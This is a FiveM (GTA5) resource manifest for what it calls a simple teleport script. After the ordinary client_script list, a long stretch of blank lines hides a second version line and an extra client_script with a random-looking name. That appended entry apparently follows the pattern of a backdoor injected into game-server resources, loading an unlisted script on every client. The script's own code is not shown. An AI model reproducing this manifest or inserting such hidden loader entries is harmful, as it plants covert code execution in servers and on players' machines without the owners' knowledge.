fx_version 'bodacious'
game 'gta5'

description 'really simple ass teleport script'

client_script {
	'config.lua',
	'client/main.lua'
}









































version 'qalle'
client_script "DISqkiIEcVydGenWnD.lua"